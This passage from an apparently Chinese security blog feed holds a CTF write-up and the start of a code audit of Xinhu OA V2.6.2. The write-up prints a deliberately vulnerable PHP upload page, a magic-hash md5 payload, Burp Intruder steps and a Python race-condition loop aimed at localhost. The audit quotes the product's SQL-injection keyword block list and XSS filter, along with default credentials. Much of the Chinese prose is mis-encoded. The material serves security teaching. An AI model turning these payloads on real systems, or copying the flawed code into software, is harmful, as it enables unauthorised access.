class="comment">//uploadsomething.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$referer</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$savepath</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$savepath</span>)) &#123;</span><br><span class="line">        <span class="variable">$oldmask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$savepath</span>, <span class="number">0777</span>);</span><br><span class="line">        <span class="title function_ invoke__">umask</span>(<span class="variable">$oldmask</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((@<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span></span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="variable">$savepath</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) . <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">100000</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Too slow!&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;label for=&quot;exampleInputEmail1&quot;&gt;Filename&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;label for=&quot;exampleInputPassword1&quot;&gt;Content&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can not see this page&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ <strong>index.php</strong> ç¬¬4è¡Œå­˜åœ¨ <strong>@parse_str($id);</strong> è¿™ä¸ªå‡½æ•°ä¸ä¼šæ£€æŸ¥å˜é‡ <strong>$id</strong> æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœé€šè¿‡å…¶ä»–æ–¹å¼ä¼ å…¥æ•°æ®ç»™å˜é‡ <strong>$id</strong> ,ä¸”å½“å‰ <strong>$id</strong> ä¸­æ•°æ®å­˜åœ¨ï¼Œå®ƒå°†ä¼šç›´æ¥è¦†ç›–æ‰ã€‚è€Œåœ¨ç¬¬6è¡Œæœ‰ä¸€æ®µè¿™æ ·ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>[<span class="number">0</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>))</span><br></pre></td></tr></table></figure><p><strong>PHP Hashæ¯”è¾ƒå­˜åœ¨ç¼ºé™·</strong> ï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚è€Œè¿™é‡Œçš„ <strong>md5(â€˜QNKCDZOâ€™)</strong> çš„ç»“æœæ˜¯ <strong>0e830400451993494058024219903391</strong>  ã€‚æ‰€ä»¥payloadä¸º <strong>?id&#x3D;a[0]&#x3D;s878926199a</strong> ã€‚è¿™æ ·å°±å¯ä»¥åœ¨é¡µé¢ä¸Šå›æ˜¾ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;uploadsomething.php&quot;</span>&gt;</span>flag is here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;;</span><br></pre></td></tr></table></figure><p>è€Œè¿™é¢˜çœŸæ­£çš„è€ƒå¯Ÿç‚¹åœ¨è¿™é‡Œã€‚åœ¨ <strong>uploadsomething.php</strong> çš„ç¬¬ä¸‰è¡Œå’Œç¬¬å››è¡Œæœ‰è¿™æ ·ä¸¤å¥ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$referer</span>)!== <span class="literal">false</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ª <strong>refer</strong> åˆ¤æ–­ï¼Œåˆ¤æ–­ <strong>refer</strong> æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæœ‰å±•ç°ä¸Šä¼ é¡µé¢ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±è¿”å› <strong>you can not see this page</strong> ã€‚</p><p>æ®æˆ‘ä»¬æ‰€çŸ¥ï¼Œé€šè¿‡aæ ‡ç­¾ç‚¹å‡»çš„é“¾æ¥ï¼Œä¼šè‡ªå·±è‡ªåŠ¨æºå¸¦ä¸Šreferå­—æ®µã€‚ç„¶å <strong>æºå¸¦refer</strong> å’Œ <strong>ä¸æºå¸¦refer</strong> ï¼Œè¿”å›çš„ç»“æœä¸ä¸€æ ·ã€‚</p><p><strong>æºå¸¦refer</strong> çš„æƒ…å†µï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-55.png"></p><p><strong>ä¸æºå¸¦refer</strong> çš„æƒ…å†µï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-56.png"></p><p>ç„¶ååœ¨ <strong>uploadsomething.php</strong> çš„ç¬¬13è¡Œå’Œç¬¬18è¡Œæœ‰è¿™æ ·ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="variable">$savepath</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) . <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100000</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;Too slow!&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$savepath</span>&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€å¥å…³é”®å°±æ˜¯ <strong>usleep(100000);</strong> è¿™é¢˜éœ€è¦åœ¨å†™å…¥ <strong>too slow</strong> ä¹‹å‰ï¼Œè®¿é—®ä¹‹å‰å†™å…¥çš„æ–‡ä»¶ï¼Œå³å¯è·å¾—flagï¼Œè¿™é‡Œå°±å­˜åœ¨æ—¶é—´ç«äº‰é—®é¢˜ã€‚ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°å…¶å®è¿™é‡Œçš„æ–‡ä»¶å¤¹è·¯å¾„æ˜¯å›ºå®šå†™æ­»çš„ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-57.png"></p><p>ç›´æ¥è®¿é—®ä¼šè¿”å› <strong>too slow</strong> ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-58.png"></p><p>å› æ­¤è¿™é‡Œçš„è§£æ³•æ˜¯ï¼Œå¼€Burpçš„200çº¿ç¨‹ï¼Œä¸€ä¸ªä¸æ–­å‘åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/parse_str/uploadsomething.php?filename=flag&amp;content=111</span><br></pre></td></tr></table></figure><p>burpå‘åŒ…æ˜¯åœ¨ <strong>intruder</strong> æ¨¡å—ä¸­ï¼Œé¦–å…ˆé€‰æ‹©æ•°æ®åŒ…ï¼Œå³é”®ç‚¹å‡»é€‰æ‹© <strong>Send to Intruder</strong> ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-59.png"></p><p>ç„¶ååœ¨ <strong>positions</strong> ç‚¹å‡» <strong>clear</strong> æŒ‰é’®</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-60.png"></p><p>åœ¨ <strong>payload</strong> ä¸­é€‰æ‹© <strong>payload type</strong> ä¸º <strong>null payloads</strong> ï¼Œ<strong>generate</strong> é€‰æ‹©200ï¼Œç„¶åå†å¯ä»¥ç‚¹å‡» <strong>start attack</strong> äº†ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-61.png"></p><p>åœ¨ <strong>start attack</strong> ä¹‹å‰éœ€è¦ä¸€ä¸ªè„šæœ¬ä¸æ–­è¯·æ±‚ä¸‹é¢è¿™ä¸ªé“¾æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/parse_str/uploads/4b84b15bff6ee5796152495a230e45e3d7e947d9/flag</span><br></pre></td></tr></table></figure><p><strong>è„šæœ¬ä»£ç </strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line">r1=r.Session()</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">r2=r1.get(<span class="string">&quot;http://127.0.0.1/parse_str/uploads/4b84b15bff6ee5796152495a230e45e3d7e947d9/flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> r2.text</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¼šå„¿å°±çœ‹åˆ°äº†flag</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-62.png"></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘ä¿¡å‘¼OA V2.6.2 ä»£ç å®¡è®¡</title>
      <link href="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/"/>
      <url>/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></p><h2 id="ä¿¡å‘¼OA-å®¡è®¡"><a href="#ä¿¡å‘¼OA-å®¡è®¡" class="headerlink" title="ä¿¡å‘¼OA å®¡è®¡"></a>ä¿¡å‘¼OA å®¡è®¡</h2><p>admin qwer1234<br>ä¿¡å‘¼OAæ˜¯ä¸€æ¬¾è‡ªä¸»MVCçš„åŠå…¬ç³»ç»Ÿï¼Œå®˜ç½‘ï¼š<a href="http://www.rockoa.com/">http://www.rockoa.com/</a></p><h2 id="å…¥å£åˆ†æ"><a href="#å…¥å£åˆ†æ" class="headerlink" title="å…¥å£åˆ†æ"></a>å…¥å£åˆ†æ</h2><p>index.php ä¸­ <code>include_once(&#39;config/config.php&#39;);</code> è·Ÿè¿›åˆ° <code>config/config.php</code>æŸ¥çœ‹<br><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image.png"><br><code>@session_start();</code> è¿™è¡Œä»£ç åœ¨ PHP ä¸­ç”¨æ¥å¯åŠ¨ä¸€ä¸ªæ–°çš„ä¼šè¯æˆ–è€…ç»§ç»­å½“å‰ä¼šè¯ã€‚è¿™é‡Œè§£é‡Šä¸€ä¸‹å„ä¸ªç»„æˆéƒ¨åˆ†çš„å«ä¹‰å’Œä½œç”¨ï¼š</p><ol><li><p><strong><code>session_start()</code> å‡½æ•°</strong>ï¼š</p><ul><li>è¿™ä¸ªå‡½æ•°ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¼šè¯æˆ–è€…æ¢å¤åŸºäºä¼šè¯æ ‡è¯†ç¬¦ä¼ é€’çš„å½“å‰å·²å­˜åœ¨çš„ä¼šè¯ã€‚è¯¥å‡½æ•°ä½¿å¾— PHP è„šæœ¬èƒ½å¤Ÿä½¿ç”¨ <code>$_SESSION</code> è¶…å…¨å±€æ•°ç»„å­˜å‚¨å’Œè®¿é—®ä¼šè¯æ•°æ®ã€‚é€šè¿‡ä¼šè¯ï¼ŒæœåŠ¡å™¨èƒ½å¤Ÿå­˜å‚¨å…³äºç”¨æˆ·çš„çŠ¶æ€ä¿¡æ¯ï¼ˆå¦‚ç”¨æˆ·èº«ä»½éªŒè¯çŠ¶æ€ã€è´­ç‰©è½¦å†…å®¹ç­‰ï¼‰ã€‚</li><li>ä¼šè¯æ•°æ®åœ¨æœåŠ¡å™¨ç«¯ä¿å­˜ï¼Œé€šå¸¸åœ¨æœåŠ¡å™¨çš„ä¸´æ—¶ç›®å½•ä¸‹ï¼Œè€Œä¸æ˜¯ç”¨æˆ·çš„è®¡ç®—æœºä¸Šï¼Œä»è€Œå¢åŠ äº†æ•°æ®çš„å®‰å…¨æ€§ã€‚å®¢æˆ·ç«¯æµè§ˆå™¨ä¼šä¿å­˜ä¸€ä¸ªä¼šè¯ ID çš„ cookieï¼Œè¯¥ ID ç”¨æ¥åœ¨å¤šä¸ªé¡µé¢è¯·æ±‚ä¹‹é—´è¯†åˆ«ç”¨æˆ·ã€‚</li></ul></li><li><p><strong><code>@</code> é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦</strong>ï¼š</p><ul><li>åœ¨ PHP ä¸­ï¼Œ<code>@</code> ç¬¦å·æ˜¯ä¸€ä¸ªé”™è¯¯æ§åˆ¶è¿ç®—ç¬¦ï¼Œç”¨äºæŠ‘åˆ¶è¡¨è¾¾å¼å¯èƒ½äº§ç”Ÿçš„é”™è¯¯æ¶ˆæ¯ã€‚å½“åœ¨è¡¨è¾¾å¼å‰åŠ ä¸Š <code>@</code> æ—¶ï¼Œä»»ä½•ç”±è¯¥è¡¨è¾¾å¼äº§ç”Ÿçš„é”™è¯¯éƒ½ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™ä½¿å¾—ä»£ç åœ¨é‡åˆ°éè‡´å‘½é”™è¯¯æ—¶å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚</li><li>ä½¿ç”¨è¿™ä¸ªè¿ç®—ç¬¦å¯ä»¥é˜²æ­¢ç”¨æˆ·çœ‹åˆ°ä¸€äº›å¯èƒ½ç”±ä¼šè¯å¯åŠ¨é—®é¢˜ï¼ˆä¾‹å¦‚ï¼Œå½“ä¼šè¯å·²ç»åœ¨å¦ä¸€ä¸ªè„šæœ¬ä¸­å¯åŠ¨æ—¶ï¼‰å¼•èµ·çš„è­¦å‘Šä¿¡æ¯ã€‚</li></ul></li><li><p><strong><code>if(function_exists(&#39;date_default_timezone_set&#39;))date_default_timezone_set(&#39;Asia/Shanghai&#39;);</code></strong></p><ul><li>è¿™é‡Œæ£€æŸ¥ <code>date_default_timezone_set</code> å‡½æ•°æ˜¯å¦å­˜åœ¨ï¼ˆä¸»è¦æ˜¯ä¸ºäº†å‘åå…¼å®¹è€ç‰ˆæœ¬çš„PHPï¼‰ã€‚å¦‚æœå­˜åœ¨ï¼Œå°±å°†é»˜è®¤æ—¶åŒºè®¾ç½®ä¸º<code>&#39;Asia/Shanghai&#39;</code>ã€‚ç¡®ä¿äº†æ‰€æœ‰åŸºäºæ—¶é—´çš„å‡½æ•°éƒ½å°†ä½¿ç”¨è¿™ä¸ªæ—¶åŒºã€‚</li></ul></li><li><p><strong><code>header(&#39;Content-Type:text/html;charset=utf-8&#39;);</code></strong></p><ul><li>è¿™è¡Œä»£ç è®¾ç½®HTTPå“åº”çš„Content-Typeå¤´ä¸º<code>text/html</code>ï¼Œå¹¶æŒ‡å®šå­—ç¬¦é›†ä¸º<code>UTF-8</code>ã€‚è¿™å‘Šè¯‰æµè§ˆå™¨è¿”å›çš„å†…å®¹æ˜¯HTMLæ–‡æœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨UTF-8ç¼–ç ï¼Œæœ‰åŠ©äºæ­£ç¡®æ˜¾ç¤ºåŒ…æ‹¬ä¸­æ–‡åœ¨å†…çš„å„ç§å­—ç¬¦ã€‚</li></ul></li><li><p><strong><code>define(&#39;ROOT_PATH&#39;,str_replace(&#39;\\&#39;,&#39;/&#39;,dirname(dirname(__FILE__))));</code></strong></p><ul><li>è¿™è¡Œä»£ç å®šä¹‰äº†ä¸€ä¸ªå¸¸é‡<code>ROOT_PATH</code>ï¼Œç”¨äºå­˜å‚¨ç³»ç»Ÿçš„æ ¹ç›®å½•è·¯å¾„ã€‚å®ƒä½¿ç”¨<code>dirname(dirname(__FILE__))</code>æ¥æ‰¾åˆ°å½“å‰æ–‡ä»¶çš„ä¸Šçº§ç›®å½•çš„ä¸Šçº§ç›®å½•ï¼ˆå³æ ¹ç›®å½•ï¼‰ï¼Œå¹¶å°†æ‰€æœ‰çš„åæ–œæ (â€˜\â€˜)æ›¿æ¢ä¸ºæ­£æ–œæ (â€˜&#x2F;â€˜)ï¼Œä»¥ä¿è¯è·¯å¾„åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸‹éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚</li></ul></li></ol><p>ä¹‹ååˆ†æåŒ…å«çš„å…¶ä¸­åŒ…å«çš„æ–‡ä»¶<code>rockFun.php, Chajian.php</code>ï¼Œå…¶ä¸­éƒ½æ²¡ä»€ä¹ˆå†…å®¹ï¼Œrockclass.phpæ·±å…¥åˆ†æ</p><h2 id="Rockclass"><a href="#Rockclass" class="headerlink" title="Rockclass"></a>Rockclass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;ip= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getclientip</span>();  <span class="comment">// è·å–å®¢æˆ·ç«¯ IP åœ°å€</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;host= <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>])? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]: <span class="string">&#x27;&#x27;</span> ;  <span class="comment">// è·å–å’Œå¤„ç† HTTP ä¸»æœºå</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;host &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;host,-<span class="number">3</span>)==<span class="string">&#x27;:80&#x27;</span>)<span class="variable language_">$this</span>-&gt;host = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:80&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;host);   <span class="comment">// å¦‚æœä¸»æœºåä»¥ç«¯å£å· 80 ç»“æŸï¼Œåˆ™ä»ä¸»æœºåä¸­ç§»é™¤ç«¯å£å·ã€‚</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;url= <span class="string">&#x27;&#x27;</span>;  <span class="comment">// å½“å‰ URL</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;isqywx= <span class="literal">false</span>;  <span class="comment">// æ˜¯å¦ä¼ä¸šå¾®ä¿¡</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;win= <span class="title function_ invoke__">php_uname</span>();  <span class="comment">// å½“å‰æ“ä½œç³»ç»Ÿ</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;HTTPweb= <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>])? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]: <span class="string">&#x27;&#x27;</span> ;  <span class="comment">// è·å–å®¢æˆ·ç«¯æµè§ˆå™¨ä¿¡æ¯</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;web= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getbrowser</span>();  <span class="comment">// è·å–å®¢æˆ·ç«¯æµè§ˆå™¨ä¿¡æ¯</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;unarr= <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;1,2&#x27;</span>);  <span class="comment">// å…è®¸ä¸Šä¼ æ–‡ä»¶ç±»å‹</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;now= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">now</span>();  <span class="comment">// å½“å‰æ—¶é—´</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;date= <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>);  <span class="comment">// å½“å‰æ—¥æœŸ</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;lvlaras  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;select ,</span></span><br><span class="line"><span class="string">alter table,delete ,drop ,update ,insert into,load_file,/*,*/,union,&lt;script,&lt;/script,sleep(,outfile,eval(,user(,phpinfo(),select*,union%20,sleep%20,select%20,delete%20,drop%20,and%20&#x27;</span>);  <span class="comment">// SQL æ³¨å…¥å…³é”®å­—</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;lvlaraa  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;select,alter,delete,drop,update,/*,*/,insert,from,time_so_sec,convert,from_unixtime,unix_timestamp,curtime,time_format,union,concat,information_schema,group_concat,length,load_file,outfile,database,system_user,current_user,user(),found_rows,declare,master,exec,(),select*from,select*&#x27;</span>);  <span class="comment">// SQL æ³¨å…¥å…³é”®å­—</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;lvlarab= <span class="keyword">array</span>();  </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;lvlaraa <span class="keyword">as</span> <span class="variable">$_i</span>)<span class="variable language_">$this</span>-&gt;lvlarab[]=<span class="string">&#x27;&#x27;</span>;   <span class="comment">// åˆ›å»ºä¸€ä¸ªä¸ $this-&gt;lvlaraa æ•°ç»„ç›¸åŒå¤§å°çš„ç©ºæ•°ç»„ï¼Œç”¨äºå­˜å‚¨è¿‡æ»¤åçš„ SQL æ³¨å…¥å…³é”®å­—ã€‚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XSSè¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">xssrepstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$xpd</span>  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;(,), ,,&lt;,&gt;,\\,*,&amp;,%,$,^,[,],&#123;,&#125;,!,@,#,&quot;,+,?,;\&#x27;&#x27;</span>);</span><br><span class="line"><span class="variable">$xpd</span>[]= <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$xpd</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–å®¢æˆ·ç«¯IPåœ°å€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*è·å–IP</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getclientip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = 